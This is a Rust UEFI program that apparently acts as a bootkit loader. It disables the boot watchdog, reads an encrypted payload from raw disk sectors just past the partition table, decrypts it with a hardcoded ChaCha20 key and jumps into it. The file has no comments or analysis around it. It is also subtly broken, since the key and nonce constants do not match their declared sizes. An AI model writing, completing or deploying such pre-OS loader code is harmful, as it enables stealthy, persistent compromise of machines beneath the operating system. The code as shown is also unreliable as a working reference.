#![no_std]
#![no_main]

use core::arch::asm;
use core::mem;
use uefi::prelude::*;
use uefi::proto::media::block::BlockIO;
use uefi::table::boot::{AllocateType, BootServices, MemoryType};
use uefi::Status;

const PAYLOAD_LBA: u64 = 34;
const PAYLOAD_SIZE: usize = 16 * 512;
const KEY: [u8; 32] = *b"d9bd784ad8acf021d9e7d95d765d361d5faea114b0fd003114e44f3dcbcf3ebb";
const NONCE: [u8; 12] = *b"9611dce38dc06dc730bbd587";

static mut POOL: [u8; 0x2000] = [0; 0x2000];
static mut POOL_OFFSET: usize = 0;

#[global_allocator]
static ALLOCATOR: BumpAllocator = BumpAllocator;

struct BumpAllocator;
unsafe impl core::alloc::GlobalAlloc for BumpAllocator {
    unsafe fn alloc(&self, layout: core::alloc::Layout) -> *mut u8 {
        let align = layout.align();
        let size = layout.size();
        let offset = POOL_OFFSET;
        let aligned_offset = (offset + align - 1) & !(align - 1);
        if aligned_offset + size <= POOL.len() {
            POOL_OFFSET = aligned_offset + size;
            POOL.as_mut_ptr().add(aligned_offset)
        } else {
            core::ptr::null_mut()
        }
    }
    unsafe fn dealloc(&self, _ptr: *mut u8, _layout: core::alloc::Layout) {}
}

#[entry]
fn efi_main(_image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
    system_table.boot_services().set_watchdog_timer(0, 0, None).unwrap();
    let boot_services = system_table.boot_services();
    unsafe { main_loop(boot_services) }
}

unsafe fn main_loop(boot_services: &BootServices) -> ! {
    let handles = boot_services
        .locate_handle_buffer(uefi::table::boot::SearchType::from_proto::<BlockIO>())
        .unwrap();
    let block_io_handle = handles[0];
    let block_io = boot_services
        .open_protocol_exclusive::<BlockIO>(block_io_handle)
        .unwrap();

    let payload_addr = boot_services
        .allocate_pages(AllocateType::AnyPages, MemoryType::LOADER_CODE, (PAYLOAD_SIZE + 0xFFF) / 0x1000)
        .unwrap() as *mut u8;
    let payload_slice = core::slice::from_raw_parts_mut(payload_addr, PAYLOAD_SIZE);

    block_io.read_blocks(block_io.media().media_id(), PAYLOAD_LBA, payload_slice).unwrap();

    let mut chacha = ChaCha20::new(&KEY, &NONCE);
    chacha.decrypt(payload_slice);

    let stub_size = 0x2000;
    let stub_addr = boot_services
        .allocate_pages(AllocateType::AnyPages, MemoryType::LOADER_CODE, 1)
        .unwrap() as *mut u8;
    let current_addr = efi_main as *const u8;
    core::ptr::copy_nonoverlapping(current_addr, stub_addr, stub_size);

    let payload_fn: extern "efiapi" fn() -> ! = mem::transmute(payload_addr);
    payload_fn();
}

struct ChaCha20 {
    state: [u32; 16],
    pos: usize,
    buffer: [u8; 64],
}

impl ChaCha20 {
    fn new(key: &[u8; 32], nonce: &[u8; 12]) -> Self {
        let mut state = [0u32; 16];
        state[0] = 0x61707865;
        state[1] = 0x3320646e;
        state[2] = 0x79622d32;
        state[3] = 0x6b206574;
        state[4] = u32::from_le_bytes([key[0], key[1], key[2], key[3]]);
        state[5] = u32::from_le_bytes([key[4], key[5], key[6], key[7]]);
        state[6] = u32::from_le_bytes([key[8], key[9], key[10], key[11]]);
        state[7] = u32::from_le_bytes([key[12], key[13], key[14], key[15]]);
        state[8] = u32::from_le_bytes([key[16], key[17], key[18], key[19]]);
        state[9] = u32::from_le_bytes([key[20], key[21], key[22], key[23]]);
        state[10] = u32::from_le_bytes([key[24], key[25], key[26], key[27]]);
        state[11] = u32::from_le_bytes([key[28], key[29], key[30], key[31]]);
        state[12] = 0;
        state[13] = u32::from_le_bytes([nonce[0], nonce[1], nonce[2], nonce[3]]);
        state[14] = u32::from_le_bytes([nonce[4], nonce[5], nonce[6], nonce[7]]);
        state[15] = u32::from_le_bytes([nonce[8], nonce[9], nonce[10], nonce[11]]);
        let mut this = Self { state, pos: 64, buffer: [0; 64] };
        this.next_block();
        this
    }

    fn quarter_round(work: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
        work[a] = work[a].wrapping_add(work[b]); work[d] ^= work[a]; work[d] = work[d].rotate_left(16);
        work[c] = work[c].wrapping_add(work[d]); work[b] ^= work[c]; work[b] = work[b].rotate_left(12);
        work[a] = work[a].wrapping_add(work[b]); work[d] ^= work[a]; work[d] = work[d].rotate_left(8);
        work[c] = work[c].wrapping_add(work[d]); work[b] ^= work[c]; work[b] = work[b].rotate_left(7);
    }

    fn next_block(&mut self) {
        let mut work = self.state;
        for _ in 0..10 {
            Self::quarter_round(&mut work, 0, 4, 8, 12);
            Self::quarter_round(&mut work, 1, 5, 9, 13);
            Self::quarter_round(&mut work, 2, 6, 10, 14);
            Self::quarter_round(&mut work, 3, 7, 11, 15);
            Self::quarter_round(&mut work, 0, 5, 10, 15);
            Self::quarter_round(&mut work, 1, 6, 11, 12);
            Self::quarter_round(&mut work, 2, 7, 8, 13);
            Self::quarter_round(&mut work, 3, 4, 9, 14);
        }
        for i in 0..16 {
            work[i] = work[i].wrapping_add(self.state[i]);
        }
        self.state[12] = self.state[12].wrapping_add(1);
        if self.state[12] == 0 {
            self.state[13] = self.state[13].wrapping_add(1);
        }
        for i in 0..16 {
            self.buffer[i * 4..i * 4 + 4].copy_from_slice(&work[i].to_le_bytes());
        }
        self.pos = 0;
    }

    fn decrypt(&mut self, data: &mut [u8]) {
        for byte in data {
            if self.pos >= 64 {
                self.next_block();
            }
            *byte ^= self.buffer[self.pos];
            self.pos += 1;
        }
    }
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {
        unsafe { asm!("hlt") }
    }
}